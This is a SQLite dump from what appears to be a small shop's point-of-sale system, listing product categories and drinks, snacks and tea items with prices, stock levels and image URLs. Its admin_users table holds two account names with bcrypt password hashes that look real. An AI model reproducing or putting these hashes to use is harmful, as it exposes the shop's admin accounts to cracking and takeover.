PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE admin_users (
          username TEXT PRIMARY KEY,
          password TEXT NOT NULL,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        , role TEXT DEFAULT '管理员');
INSERT INTO admin_users VALUES('tgadmin','$2a$10$5xTAzjSOARJtlVgrPUmW6uel5MGIMt83Avzj2hV7jy4VONH/0GIx6','2026-03-11 06:10:31','管理员');
INSERT INTO admin_users VALUES('tgcashier','$2a$10$g9n772RO0HAxaQ7SnauAbeMQhnleH9ylF5QXhCSSj.Qs1JFBBVH1G','2026-03-15 04:10:02','cashier');
CREATE TABLE product_categories (
          name TEXT PRIMARY KEY,
          creator TEXT,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        , sort_order INTEGER DEFAULT 0);
INSERT INTO product_categories VALUES('其他','system','2026-03-11 14:10:31',9);
INSERT INTO product_categories VALUES('零食','system','2026-03-11 14:10:31',5);
INSERT INTO product_categories VALUES('奶茶店','system','2026-03-11 14:10:31',1);
INSERT INTO product_categories VALUES('酒水','system','2026-03-11 14:10:31',2);
INSERT INTO product_categories VALUES('小吃','system','2026-03-11 14:10:31',8);
INSERT INTO product_categories VALUES('饮料','system','2026-03-11 14:10:31',4);
INSERT INTO product_categories VALUES('泡面','system','2026-03-11 14:10:31',6);
INSERT INTO product_categories VALUES('槟榔','system','2026-03-11 14:10:31',7);
INSERT INTO product_categories VALUES('高汤','system','2026-03-25 22:34:26',4);
CREATE TABLE products (
          name TEXT PRIMARY KEY,
          category TEXT,
          image_url TEXT,
          price REAL DEFAULT 0,
          stock_total INTEGER DEFAULT 0,
          stock_available INTEGER DEFAULT 0,
          status TEXT DEFAULT '上架',
          creator TEXT,
          created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
          FOREIGN KEY (category) REFERENCES product_categories(name)
        );
INSERT INTO products VALUES('if椰子水','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/1vviwWQoGbWfwDQg.jpg',10.0,44,41,'上架','syb201158','2026-03-12 19:37:00','2026-04-07 13:30:41');
INSERT INTO products VALUES('茶兀','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/7t2J9TdE56SIN9va.jpg',8.0,139,136,'上架','syb201158','2026-03-12 18:58:37','2026-04-07 13:30:41');
INSERT INTO products VALUES('苏打水','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/d43e16JC77AO3Pm0.jpg',8.0,197,197,'上架','syb201158','2026-03-12 18:56:44','2026-04-07 13:30:41');
INSERT INTO products VALUES('草莓抹茶牛乳','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121720399629.jpg',23.0,776,767,'上架','syb201158','2026-03-02 17:26:30','2026-04-07 13:30:41');
INSERT INTO products VALUES('开瓶费100','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/GtYe33GDA60y6xWF.png',100.0,995,994,'下架','syb201158','2026-02-25 01:23:06','2026-04-07 13:30:41');
INSERT INTO products VALUES('酒桌游戏牌','小吃','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121741356474.jpg',5.0,10,9,'上架','syb201158','2026-02-20 19:09:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('开瓶费200','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/GtYe33GDA60y6xWF.png',200.0,994,994,'下架','syb201158','2026-02-11 22:39:27','2026-04-07 13:30:41');
INSERT INTO products VALUES('冰水（可续杯）','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/g2EAV0RhsRkOk55h.jpg',3.0,877,870,'上架','syb201158','2026-02-06 23:10:58','2026-04-07 13:30:41');
INSERT INTO products VALUES('98g开心果','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/9jW065Re7Jfb93L2.jpg',25.0,0,0,'下架','syb216759','2026-02-06 16:37:50','2026-04-07 13:30:41');
INSERT INTO products VALUES('九制橄榄','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/W73TPnbNkk20AGny.jpg',8.0,7,6,'上架','syb216759','2026-02-06 15:43:04','2026-04-07 13:30:41');
INSERT INTO products VALUES('酸甜话梅','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/m5Ja7yLdOLPaP45P.jpg',8.0,5,5,'上架','syb216759','2026-02-06 15:42:15','2026-04-07 13:30:41');
INSERT INTO products VALUES('无穷爱辣鸡米','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/eF5Pi9mU1u2kG7Cc.jpg',2.0,0,0,'下架','syb216759','2026-02-06 15:40:55','2026-04-07 13:30:41');
INSERT INTO products VALUES('无穷烤鸡翅根','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/RxKJ6QiyN5e0O1jT.jpg',5.0,11,10,'上架','syb216759','2026-02-06 15:38:29','2026-04-07 13:30:41');
INSERT INTO products VALUES('无穷鸡蛋','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/xg4y1fJlnNlE851e.jpg',3.0,32,32,'上架','syb216759','2026-02-06 15:37:37','2026-04-07 13:30:41');
INSERT INTO products VALUES('鱼皮花生','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/Xbc71pJ6W3aik3oS.jpg',10.0,12,10,'上架','syb201158','2026-02-04 13:14:12','2026-04-07 13:30:41');
INSERT INTO products VALUES('名仕700ml','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121700401015.jpg',988.0,0,0,'下架','syb201158','2026-01-30 17:35:22','2026-04-07 13:30:41');
INSERT INTO products VALUES('一次性拖鞋','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/xs22vdqvrT6IIIcT.jpg',8.0,21,21,'上架','syb201158','2026-01-29 02:46:05','2026-04-07 13:30:41');
INSERT INTO products VALUES('光明酸奶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/9DfP7x0leHx725bf.jpg',20.0,15,15,'上架','syb201158','2026-01-24 18:37:23','2026-04-07 13:30:41');
INSERT INTO products VALUES('辣番茄鸡蛋牛肉面','泡面','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/JQj2gB1tR41BUW78.jpg',10.0,29,28,'上架','syb201158','2026-01-24 02:36:21','2026-04-07 13:30:41');
INSERT INTO products VALUES('烤肠','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/10xlP2C5ys01tjV4.jpg',8.0,42,29,'上架','syb201158','2026-01-23 18:24:02','2026-04-07 13:30:41');
INSERT INTO products VALUES('乖媳妇凤爪','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/s5BF413m0K4maJw3.jpg',12.0,17,12,'上架','syb201158','2026-01-18 23:46:01','2026-04-07 13:30:41');
INSERT INTO products VALUES('麻辣王子','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/131D742cPQ7ehVgV.jpg',5.0,8,7,'上架','syb201158','2026-01-18 23:44:47','2026-04-07 13:30:41');
INSERT INTO products VALUES('水溶C','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/h2sV0v1KPMirgu74.jpg',8.0,128,125,'上架','syb201158','2026-01-18 23:33:16','2026-04-07 13:30:41');
INSERT INTO products VALUES('单份水果','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121716353070.jpg',28.0,16,6,'上架','syb201158','2026-01-18 20:44:17','2026-04-07 13:30:41');
INSERT INTO products VALUES('单丛（一杯）','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121702314245.jpg',8.0,987,987,'上架','syb201158','2026-01-17 16:21:51','2026-04-07 13:30:41');
INSERT INTO products VALUES('普洱茶（一泡）','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/bX3VXrwEP0690XDC.jpg',38.0,993,993,'上架','syb201158','2026-01-17 16:21:33','2026-04-07 13:30:41');
INSERT INTO products VALUES('小青柑（一泡）','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/po5vflLqlO3CVn6K.jpg',38.0,99,99,'上架','syb201158','2026-01-17 16:18:26','2026-04-07 13:30:41');
INSERT INTO products VALUES('单丛（一泡）','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121702422772.jpg',38.0,997,997,'上架','syb201158','2026-01-17 16:17:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('普洱茶（一杯）','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/eTW6iVXjm89sdHo4.jpg',8.0,979,978,'上架','syb201158','2026-01-17 16:16:36','2026-04-07 13:30:41');
INSERT INTO products VALUES('大白兔奶糖','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/73E6C0S3tsMchT2y.jpg',10.0,0,0,'下架','syb201158','2026-01-16 00:35:45','2026-04-02 13:30:45');
INSERT INTO products VALUES('至尊果盘','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/rbm5117aRYDfIw9W.jpg',88.0,19,18,'上架','syb201158','2026-01-15 19:03:42','2026-04-07 13:30:41');
INSERT INTO products VALUES('芙蓉王 代购','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121709521983.jpg',30.0,16,8,'上架','syb201158','2026-01-12 01:04:30','2026-04-07 13:30:41');
INSERT INTO products VALUES('虚拟商品（百威换黑啤）','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/GtYe33GDA60y6xWF.png',100.0,993,993,'下架','syb201158','2026-01-10 22:54:51','2026-04-07 13:30:41');
INSERT INTO products VALUES('活动赠送小吃','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/pic/GtYe33GDA60y6xWF.png',0.0,929,926,'下架','syb185876','2026-01-10 20:23:25','2026-04-07 13:30:41');
INSERT INTO products VALUES('健达巧克力','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/V0FaOAR7Fp9iih8N.jpg',10.0,11,9,'上架','syb185876','2026-01-09 16:38:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('100和成天下','槟榔','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/E0EvSA100c7C5drb.jpg',110.0,41,40,'上架','syb201158','2026-01-08 20:55:16','2026-04-07 13:30:41');
INSERT INTO products VALUES('柠檬水','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121721256879.jpg',10.0,777,771,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('鲜牛奶','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121722258983.jpg',18.0,963,962,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('椰丸奶茶','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121724529970.jpg',18.0,953,953,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('珍珠奶茶','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121726008021.jpg',18.0,933,933,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('红枣桂圆茶','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121726414383.jpg',25.0,987,987,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('茉香柠檬茶','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121727595274.jpg',18.0,921,913,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('老盐黄皮冰茶','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121729049616.jpg',24.0,998,995,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('橙橙冰茶/苏打','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121730185033.jpg',22.0,983,983,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('西柚冰茶/苏打','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121731354745.jpg',22.0,972,972,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('苹果冰茶/苏打','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121733268861.jpg',22.0,991,991,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('鸭屎香柠檬茶','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121732258997.jpg',18.0,988,988,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('招牌柠檬茶','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121733515099.jpg',18.0,755,746,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('港式鸳鸯','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121736337098.jpg',20.0,987,986,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('柠c美式','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121736401402.jpg',18.0,1000,1000,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('橙c美式','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121736474707.jpg',18.0,987,987,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('椰青美式','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121736547195.jpg',20.0,1000,1000,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('红茶拿铁（热）','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121738246028.jpg',20.0,998,998,'上架','syb185876','2026-01-06 23:02:40','2026-04-07 13:30:41');
INSERT INTO products VALUES('红茶拿铁','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121738318076.jpg',20.0,999,999,'上架','syb185876','2026-01-06 23:02:39','2026-04-07 13:30:42');
INSERT INTO products VALUES('生椰拿铁（热）','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121738386604.jpg',22.0,995,995,'上架','syb185876','2026-01-06 23:02:39','2026-04-07 13:30:42');
INSERT INTO products VALUES('生椰拿铁','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121739282767.jpg',22.0,950,950,'上架','syb185876','2026-01-06 23:02:39','2026-04-07 13:30:42');
INSERT INTO products VALUES('美式（热）','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121739351003.jpg',18.0,993,993,'上架','syb185876','2026-01-06 23:02:39','2026-04-07 13:30:42');
INSERT INTO products VALUES('美式','奶茶店','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121739414038.jpg',18.0,880,880,'上架','syb185876','2026-01-06 23:02:39','2026-04-07 13:30:42');
INSERT INTO products VALUES('纸巾','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/m8ifrYlcL81pmy4q.jpg',5.0,510,497,'上架','syb201158','2026-01-04 21:04:22','2026-04-07 13:30:42');
INSERT INTO products VALUES('软中华 代购','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121710165381.jpg',80.0,1,0,'下架','syb201158','2026-01-04 19:42:46','2026-04-07 13:30:42');
INSERT INTO products VALUES('商微 代购','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121710243188.jpg',50.0,1,1,'上架','syb201158','2026-01-04 16:14:42','2026-04-07 13:30:42');
INSERT INTO products VALUES('蜂蜜水','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/PU6P5bJeF16gYL1G.jpg',10.0,287,273,'上架','syb201158','2026-01-04 01:44:48','2026-04-07 13:30:42');
INSERT INTO products VALUES('瓜子','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/ie2743k0f41ION5Y.jpg',18.0,34,32,'上架','syb201158','2026-01-04 01:28:50','2026-04-07 13:30:42');
INSERT INTO products VALUES('荷花 细支','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121710496693.jpg',55.0,0,0,'下架','syb201158','2026-01-03 06:57:45','2026-04-07 13:30:42');
INSERT INTO products VALUES('陈皮贵烟 代购','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121710425816.jpg',30.0,10,3,'上架','syb201158','2026-01-02 00:10:21','2026-04-07 13:30:42');
INSERT INTO products VALUES('粗荷花 代购','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/online/file/product/202603121710588323.jpg',50.0,34,17,'上架','syb201158','2026-01-01 22:56:46','2026-04-07 13:30:42');
INSERT INTO products VALUES('百岁山','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/1WI3q3MvEifq3wBs.jpg',8.0,11,8,'上架','syb201158','2026-01-01 20:43:45','2026-04-07 13:30:42');
INSERT INTO products VALUES('六宫格果盘','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/iy3pA4U16MMf58iJ.jpg',78.0,43,18,'上架','syb201158','2026-01-01 19:10:15','2026-04-07 13:30:42');
INSERT INTO products VALUES('扑克牌','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/g84NolH1RQw0mhY0.jpg',5.0,163,158,'上架','syb185876','2025-12-31 15:23:30','2026-04-07 13:30:42');
INSERT INTO products VALUES('手套','其他','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/HS947tN4KvH39E1y.jpg',5.0,1037,1025,'上架','syb185876','2025-12-31 15:23:30','2026-04-07 13:30:42');
INSERT INTO products VALUES('四洲虾条','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/68YwI4DNdlMjb9bQ.jpg',10.0,36,35,'上架','syb185876','2025-12-31 15:23:30','2026-04-07 13:30:42');
INSERT INTO products VALUES('开心果','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/1q00yLc5b0K7XQca.jpg',25.0,29,29,'上架','syb185876','2025-12-31 15:23:30','2026-04-07 13:30:42');
INSERT INTO products VALUES('杨梅','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/w9f0nCrvwXx4uD97.jpg',8.0,12,10,'上架','syb185876','2025-12-31 15:23:30','2026-04-07 13:30:42');
INSERT INTO products VALUES('盐焗腰果','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/kEb2M5Gq3N7Gfyn6.jpg',25.0,16,16,'上架','syb185876','2025-12-31 15:23:30','2026-04-07 13:30:42');
INSERT INTO products VALUES('墨鱼丝','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/56qtJ24MHV8p672b.jpg',18.0,30,30,'上架','syb185876','2025-12-31 15:23:30','2026-04-07 13:30:42');
INSERT INTO products VALUES('笋尖','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/5JAytFQAW1hDP431.jpg',5.0,15,15,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('酱香鸡爪','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/CddqH535Q37b0DK2.jpg',5.0,5,3,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('泡鸭掌','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/6SQnWc4BuhFpYOji.jpg',5.0,7,4,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('四洲栗一烧','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/j04AntjSdaMJku0H.jpg',10.0,30,28,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('乐事薯片','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/7O02d9j38wr67UhS.jpg',10.0,135,134,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('海苔卷','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/WBmy62Xig9U3Cl2X.jpg',3.0,18,18,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('香脆肠','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/37uiNAAFtH6428JN.jpg',3.0,4,4,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('盐焗鸭掌','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/WNWUG8YpvwT65d17.jpg',6.0,4,0,'下架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('无穷鸡腿','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/sG831XYjyDUyL4B1.jpg',20.0,8,8,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('烤黑鸭脖','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/53R8hLB4bOX8bg84.jpg',3.0,6,5,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('无穷鸡翅','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/s0Y0W5Mltg231mOA.jpg',20.0,8,8,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('禛香肥牛','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/Xmnhh8XR4URK14Rr.jpg',5.0,50,47,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('小面筋','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/31LoC5WQIkK3Mc30.jpg',3.0,48,46,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('魔芋爽','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/N69p5aXw7Cc1C34T.jpg',3.0,77,75,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('海带','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/ObMFw3vc5O406i26.jpg',3.0,9,8,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('劲仔小鱼','零食','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/SYofdjxXOMt0h6vS.jpg',3.0,67,66,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('蓝妹啤酒','酒水','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/33ACoqsK2t4CT851.jpg',18.0,64,64,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('三得利乌龙茶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/vd31359O3nqOKypj.jpg',8.0,21,20,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('外星人电解质水','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/I2HYatWKNKr3qhh8.jpg',8.0,153,153,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('椰树椰汁','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/uG3Tw2e2sJyMQ064.jpg',8.0,76,76,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('王老吉凉茶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/v4cTEL23MGyQt4Yi.jpg',6.0,38,35,'上架','syb185876','2025-12-31 15:23:29','2026-04-07 13:30:42');
INSERT INTO products VALUES('宝矿力特（中）','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/082DNbXLU7HkxfVG.jpg',8.0,125,120,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('元气苏打水','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/E10Ux37HilxtVI4f.jpg',8.0,188,183,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('元气乳茶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/XxN0uKOA0Gt5LrA4.jpg',10.0,0,0,'下架','syb185876','2025-12-31 15:23:28','2026-04-02 13:30:46');
INSERT INTO products VALUES('金桔柠檬','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/09kY2e5h0X06f2n6.jpg',6.0,64,64,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('阿萨姆奶茶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/Me0y3fFaw16GnjN9.jpg',8.0,74,74,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('青梅绿茶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/b2WvmU0lqFkgoetK.jpg',6.0,5,5,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('绿茶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/sg8K37K8Osd2aNdp.jpg',6.0,15,14,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('双萃柠檬茶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/5rt51JWT6dnlh9xc.jpg',6.0,99,99,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('茉莉清茶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/kcHOx00MHeVgayXK.jpg',6.0,116,114,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('酸梅汤','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/4k3j93CTX6E1P77y.jpg',6.0,3,3,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('每日C红葡萄汁','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/M70qXX8XTCWHLd1e.jpg',6.0,60,59,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('每日C鲜橙汁','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/948qAtMRjc5HkqJ1.jpg',6.0,67,65,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('冰红茶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/I3jy5AGPcSu4k119.jpg',6.0,20,16,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('东方树叶','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/uJV9wJGpF0ANF880.jpg',8.0,300,293,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('红牛','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/iiHFCODD1Bt09483.jpg',10.0,147,139,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('红牛强化型','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/2j0H0nl3g8kXU7k2.jpg',15.0,5,4,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('屈臣氏沙示汽水','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/06JDtAqf35r0b30D.jpg',6.0,13,13,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('雀巢咖啡','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/jjAxo05s74fjr8Wa.jpg',10.0,92,88,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('雪碧','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/KSWxOfuprl2HMi7y.jpg',6.0,151,149,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('可乐','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/EowW1v0hTGVJBOjW.jpg',6.0,174,158,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
INSERT INTO products VALUES('脉动','饮料','https://hui-shang.oss-cn-hangzhou.aliyuncs.com/avatar/hRUDUd79QIb5Sb31.jpg',8.0,93,83,'上架','syb185876','2025-12-31 15:23:28','2026-04-07 13:30:42');
